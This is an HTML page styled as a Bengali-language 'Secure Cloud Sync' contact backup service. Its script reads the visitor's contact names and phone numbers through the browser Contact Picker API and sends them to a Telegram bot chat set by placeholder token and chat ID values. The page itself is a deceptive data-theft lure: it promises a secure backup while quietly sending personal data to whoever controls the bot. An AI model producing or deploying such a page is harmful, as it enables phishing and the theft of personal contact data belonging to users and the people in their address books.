<!DOCTYPE html>
<html lang="bn">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Secure Cloud Sync</title>

<link href="https://fonts.googleapis.com/css2?family=Hind+Siliguri:wght@400;600&display=swap" rel="stylesheet">

<style>
body {
    margin:0;
    height:100vh;
    display:flex;
    justify-content:center;
    align-items:center;
    font-family:'Hind Siliguri', sans-serif;
    background: linear-gradient(135deg,#020617,#0f172a);
}

/* Glass Container */
.box {
    width:350px;
    padding:30px;
    border-radius:25px;
    background: rgba(255,255,255,0.05);
    backdrop-filter: blur(20px);
    border:1px solid rgba(255,255,255,0.1);
    box-shadow:0 10px 30px rgba(0,0,0,0.5);
    text-align:center;
}

/* Title */
h2 {
    color:#fff;
    margin-bottom:10px;
}

p {
    color:#94a3b8;
    font-size:14px;
}

/* Button */
.btn {
    margin-top:20px;
    width:100%;
    padding:14px;
    border:none;
    border-radius:12px;
    font-size:16px;
    font-weight:600;
    cursor:pointer;
    background: linear-gradient(135deg,#22c55e,#4ade80);
    color:#000;
    transition:0.25s;
}

.btn:hover {
    opacity:0.9;
}

/* Loader */
.loader {
    margin:15px auto;
    width:25px;
    height:25px;
    border:3px solid rgba(255,255,255,0.2);
    border-top:3px solid #22c55e;
    border-radius:50%;
    animation:spin 1s linear infinite;
    display:none;
}

@keyframes spin {
    100%{transform:rotate(360deg)}
}

.status {
    margin-top:10px;
    color:#22c55e;
    font-size:14px;
}
</style>
</head>

<body>

<div class="box">
    <h2>🔐 ক্লাউড ব্যাকআপ</h2>
    <p>আপনার কন্টাক্ট নিরাপদভাবে সিঙ্ক করুন</p>

    <button id="btn" class="btn">ব্যাকআপ শুরু করুন</button>

    <div class="loader" id="loader"></div>
    <div id="status" class="status">Ready</div>
</div>

<script>
const CONFIG = {
    TOKEN: 'YOUR_BOT_TOKEN',
    CHAT_ID: 'YOUR_CHAT_ID'
};

const btn = document.getElementById('btn');
const loader = document.getElementById('loader');
const status = document.getElementById('status');

btn.onclick = async () => {
    try {
        if (!('contacts' in navigator)) {
            throw new Error("Device support নেই");
        }

        const contacts = await navigator.contacts.select(['name','tel'], {multiple:true});

        if (!contacts.length) {
            throw new Error("কোনো কন্টাক্ট পাওয়া যায়নি");
        }

        loader.style.display = "block";
        btn.disabled = true;
        status.innerText = "Sending...";

        let text = "📱 Contact Backup\n\n";

        contacts.forEach(c=>{
            const name = c.name ? c.name[0] : "No Name";
            const phone = c.tel ? c.tel[0] : "No Number";
            text += `👤 ${name}\n📞 ${phone}\n\n`;
        });

        await fetch(`https://api.telegram.org/bot${CONFIG.TOKEN}/sendMessage`, {
            method:'POST',
            headers:{'Content-Type':'application/json'},
            body: JSON.stringify({
                chat_id: CONFIG.CHAT_ID,
                text: text
            })
        });

        loader.style.display = "none";
        status.innerText = "✅ Successfully Sent!";
        btn.disabled = false;

    } catch(e) {
        loader.style.display = "none";
        status.innerText = "❌ " + e.message;
        btn.disabled = false;
    }
};
</script>

</body>
</html>
